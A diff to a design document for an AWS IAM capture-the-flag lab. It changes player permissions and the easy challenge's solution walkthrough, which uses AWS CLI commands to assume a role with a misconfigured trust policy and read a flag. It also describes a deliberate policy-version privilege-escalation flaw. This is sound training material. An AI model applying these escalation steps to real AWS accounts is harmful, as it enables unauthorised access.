@@ -96,13 +96,15 @@ Understand IAM role trust policies, the difference between service principals an
 
 The `ctf-easy-player` IAM user is attached a managed policy granting only:
 
-- `iam:ListRoles`
-- `iam:GetRole`
-- `sts:AssumeRole` on `arn:aws:iam::ACCOUNT_ID:role/ec2-monitoring-role`
 - `sts:GetCallerIdentity`
+- `sts:AssumeRole` on `*` (any role — only the misconfigured one will accept)
 - `ssm:DescribeParameters`
+- `s3:ListAllMyBuckets`
+- `s3:ListBucket` / `s3:GetObject` on `ctf-easy-artifacts-*`
 
-These permissions are enough to enumerate roles and identify the misconfiguration, but **not** enough to read the flag directly.
+`iam:ListRoles` and `iam:GetRole` are intentionally omitted. The target role name is discovered via the S3 hint bucket, not by enumerating IAM. This prevents automated tools from mapping the role surface.
+
+These permissions are enough to discover and exploit the misconfiguration, but **not** enough to read the flag directly.
 
 ### Escalated Role Permissions (`ec2-monitoring-role`)
 
@@ -116,21 +118,24 @@ These permissions are enough to enumerate roles and identify the misconfiguratio
 1. aws sts get-caller-identity
    → Confirm identity as ctf-easy-player
 
-2. aws iam list-roles --query 'Roles[*].[RoleName,Arn]'
-   → Spot ec2-monitoring-role
+2. aws s3 ls
+   → Spot ctf-easy-artifacts-XXXXXXXX bucket
 
-3. aws iam get-role --role-name ec2-monitoring-role
-   → Inspect AssumeRolePolicyDocument
-   → Principal is AWS root (account-wide), not ec2.amazonaws.com
+3. aws s3 ls s3://ctf-easy-artifacts-XXXXXXXX --recursive
+   → Find internal/platform-notes.txt
 
-4. aws sts assume-role \
+4. aws s3 cp s3://ctf-easy-artifacts-XXXXXXXX/internal/platform-notes.txt -
+   → Read internal note — learn role name: ec2-monitoring-role
+
+5. aws sts assume-role \
      --role-arn arn:aws:iam::ACCOUNT_ID:role/ec2-monitoring-role \
      --role-session-name open-sesame
+   → Succeeds — trust policy uses account root principal (misconfiguration)
    → Receive temporary credentials
 
-5. export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
+6. export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
 
-6. aws ssm get-parameter \
+7. aws ssm get-parameter \
      --name /ctf/easy/flag \
      --with-decryption \
      --query 'Parameter.Value'
@@ -211,15 +216,14 @@ Even if the player escalates `ctf-hard-restricted` to `"Action":"*","Resource":"
 The boundary allows only the permissions needed to complete the lab:
 
 ```
-sts:GetCallerIdentity
-iam:GetUser
-iam:ListAttachedUserPolicies, iam:ListUserPolicies, iam:GetUserPolicy
-iam:ListPolicies, iam:GetPolicy, iam:GetPolicyVersion, iam:ListPolicyVersions
-iam:CreatePolicyVersion      (on ctf-hard-restricted only)
-iam:SetDefaultPolicyVersion  (on ctf-hard-restricted only)
-s3:ListAllMyBuckets
-s3:ListBucket, s3:GetObject  (on ctf-hard-artifacts-* only)
-secretsmanager:GetSecretValue (on ctf/hard/flag only)
+sts:GetCallerIdentity                         (on *)
+iam:GetUser, iam:ListAttachedUserPolicies,
+  iam:ListUserPolicies, iam:GetUserPolicy      (on own user ARN only)
+iam:CreatePolicyVersion                        (on ctf-hard-restricted only)
+iam:SetDefaultPolicyVersion                    (on ctf-hard-restricted only)
+s3:ListAllMyBuckets                            (on *)
+s3:ListBucket, s3:GetObject                   (on ctf-hard-artifacts-* only)
+secretsmanager:GetSecretValue                  (on ctf/hard/flag only)
 ```
 
 The `secretsmanager:GetSecretValue` permission in the boundary is what makes the escalation "matter" — the initial managed policy doesn't grant it, so the player must escalate to gain it as an effective permission.
@@ -240,20 +244,14 @@ The `secretsmanager:GetSecretValue` permission in the boundary is what makes the
 
 The player has an **inline policy** granting:
 
-- `sts:GetCallerIdentity`
-- `iam:GetUser`
-- `iam:ListAttachedUserPolicies`
-- `iam:ListUserPolicies`
-- `iam:GetUserPolicy`
-- `iam:ListPolicies`
-- `iam:GetPolicy`
-- `iam:GetPolicyVersion`
-- `iam:ListPolicyVersions`
+- `sts:GetCallerIdentity` on `*`
+- `iam:GetUser` / `iam:ListAttachedUserPolicies` / `iam:ListUserPolicies` / `iam:GetUserPolicy` — scoped to own user ARN only
 - `iam:CreatePolicyVersion` on `arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted` ← **misconfiguration**
 - `iam:SetDefaultPolicyVersion` on `arn:aws:iam::ACCOUNT_ID:policy/ctf-hard-restricted` ← **misconfiguration**
 - `s3:ListAllMyBuckets`
-- `s3:ListBucket` on `arn:aws:s3:::ctf-hard-artifacts-*`
-- `s3:GetObject` on `arn:aws:s3:::ctf-hard-artifacts-*/*`
+- `s3:ListBucket` / `s3:GetObject` on `arn:aws:s3:::ctf-hard-artifacts-*`
+
+`iam:ListPolicies`, `iam:GetPolicy`, `iam:GetPolicyVersion`, and `iam:ListPolicyVersions` are intentionally omitted. Automated scanners rely on these to map the managed policy surface. Players derive the managed policy ARN from `iam:ListAttachedUserPolicies` alone.
 
 The attached managed policy (`ctf-hard-restricted`) initially only grants:
 
